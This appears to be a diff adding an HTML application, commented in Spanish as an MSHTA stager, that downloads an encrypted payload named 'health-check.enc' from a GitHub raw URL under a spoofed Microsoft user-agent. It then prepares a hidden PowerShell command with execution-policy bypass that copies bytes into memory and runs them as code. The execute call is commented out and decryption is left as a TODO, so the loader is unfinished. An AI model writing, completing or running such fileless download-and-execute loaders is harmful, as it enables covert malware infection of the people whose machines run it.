@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script language="VBScript">
+' ========================================================================
+' STAGER MSHTA - Carga payload en memoria sin tocar disco
+' ========================================================================
+
+Const PAYLOAD_URL = "https://raw.githubusercontent.com/ggggwrmsfootmen/curly-fortnight/refs/heads/main/health-check.enc"
+Const AES_KEY = "MySecretKey12345"
+Const AES_IV = "MySecretIV123456"
+
+' Cargar CryptoJS
+Dim cryptoJsPath
+cryptoJsPath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(location.pathname)
+If Left(cryptoJsPath, 5) = "file:" Then
+    cryptoJsPath = Mid(cryptoJsPath, 9) ' Quitar file:///
+End If
+cryptoJsPath = Replace(cryptoJsPath, "/", "\")
+
+' Cargar scripts
+Dim fso, f
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Cargar CryptoJS AES
+If fso.FileExists(cryptoJsPath & "\cryptojs-aes.js") Then
+    Set f = fso.OpenTextFile(cryptoJsPath & "\cryptojs-aes.js", 1)
+    ExecuteGlobal f.ReadAll()
+    f.Close()
+End If
+
+' Cargar CryptoJS CFB
+If fso.FileExists(cryptoJsPath & "\cryptojs-mode-cfb.js") Then
+    Set f = fso.OpenTextFile(cryptoJsPath & "\cryptojs-mode-cfb.js", 1)
+    ExecuteGlobal f.ReadAll()
+    f.Close()
+End If
+
+MsgBox "CryptoJS cargado"
+
+' Descargar payload
+Dim xhr
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET", PAYLOAD_URL, False
+xhr.setRequestHeader "User-Agent", "Microsoft-Delivery-Optimization/10.0"
+xhr.Send
+
+If xhr.Status = 200 Then
+    MsgBox "Payload descargado: " & Len(xhr.responseText) & " bytes"
+    
+    ' TODO: Descifrar con CryptoJS
+    ' TODO: Cargar en memoria con PowerShell
+    
+    ' Ejecutar PowerShell para cargar en memoria
+    Dim shell, ps_cmd
+    Set shell = CreateObject("WScript.Shell")
+    
+    ps_cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$buf=@(); " & _
+             "$addr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length); " & _
+             "[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$addr,$buf.Length); " & _
+             "$runner=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr,[Action]); " & _
+             "$runner.Invoke()"""
+    
+    ' shell.Run ps_cmd, 0, False
+    MsgBox "Comando PowerShell preparado"
+Else
+    MsgBox "Error HTTP: " & xhr.Status
+End If
+
+' Cerrar MSHTA
+window.close()
+
+</script>
+</head>
+<body>
+<p>Cargando...</p>
+</body>
+</html>
